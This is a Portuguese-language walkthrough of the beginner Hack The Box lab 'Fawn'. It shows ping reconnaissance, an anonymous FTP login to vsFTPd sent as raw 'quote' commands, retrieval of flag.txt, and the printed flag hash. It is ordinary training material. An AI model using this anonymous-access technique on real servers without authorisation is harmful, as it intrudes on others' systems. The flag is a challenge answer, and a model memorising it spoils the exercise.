# HTB - Starting Point - Fawn

🇺🇸 [English version](./README.md)

| Info        | Detalhe             |
|-------------|----------------------|
| Plataforma  | Hack The Box         |
| Track       | Starting Point       |
| Dificuldade | Muito Fácil          |
| OS          | Linux                |
| Status      | ✅ Resolvido          |

## Sumário
- [HTB - Starting Point - Fawn](#htb---starting-point---fawn)
  - [Sumário](#sumário)
  - [Recon](#recon)
    - [Teste de conectividade](#teste-de-conectividade)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lições aprendidas](#lições-aprendidas)

---

## Recon

Iniciei a máquina alvo pela plataforma do HTB, obtendo o endereço de IP do target:

**IP do alvo:** `10.129.160.55`

Em seguida, conectei na Pwnbox (máquina de ataque fornecida pelo HTB) e, através dela, me conectei na rede do target via VPN.

### Teste de conectividade

Para confirmar que o alvo estava acessível, rodei um `ping`:

```bash
ping 10.129.160.55
```

```
64 bytes from 10.129.160.55: icmp_seq=1 ttl=63 time=7.39 ms
64 bytes from 10.129.160.55: icmp_seq=2 ttl=63 time=7.50 ms
64 bytes from 10.129.160.55: icmp_seq=3 ttl=63 time=7.63 ms
```

O host respondeu normalmente, confirmando que a máquina estava online e acessível pela rede da VPN.

---

## Enumeration

Antes de prosseguir, verifiquei o menu de ajuda/uso do cliente `ftp` para revisar suas flags disponíveis:

```bash
ftp -?
```

Em seguida, conectei ao alvo na porta padrão do FTP:

```bash
ftp 10.129.160.55
```

O banner do serviço identificou o servidor como **vsFTPd 3.0.3**.

Primeiro tentei logar como `root`, mas as credenciais foram rejeitadas:

```
Name (10.129.160.55:root): root
530 Login incorrect.
```

Como servidores FTP frequentemente estão mal configurados permitindo acesso anônimo, tentei essa abordagem em seguida, usando comandos brutos do protocolo FTP via `quote`:

```bash
quote USER anonymous
quote PASS anonymous@
```

```
331 Please specify the password.
230 Login successful.
```

O login anônimo foi aceito.

---

## Exploitation

Após autenticado, verifiquei o menu de ajuda interno do cliente para revisar os comandos disponíveis:

```bash
?
```

Listei o conteúdo do diretório remoto:

```bash
ls
```

```
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

Um arquivo `flag.txt` legível estava presente. Fiz o download para minha máquina local:

```bash
get flag.txt
```

```
226 Transfer complete.
32 bytes received in 00:00 (4.28 KiB/s)
```

Encerrei a sessão FTP e li o arquivo localmente:

```bash
bye
cat flag.txt
```

---

## Flag

```
035db21c881520061c53e0536e44f815
```

---

## Lições aprendidas

- FTP (vsFTPd) é um protocolo de texto claro — credenciais e dados transferidos trafegam sem criptografia pela rede.
- Acesso FTP anônimo é uma falha de configuração comum que pode expor arquivos sensíveis sem exigir credenciais válidas.
- O comando `quote` é útil para enviar comandos brutos do protocolo diretamente ao servidor, o que ajuda quando o cliente não expõe a ação desejada de forma nativa.
- Sempre enumere os serviços cuidadosamente (banners, comandos disponíveis, listagem de diretórios) antes de assumir um beco sem saída.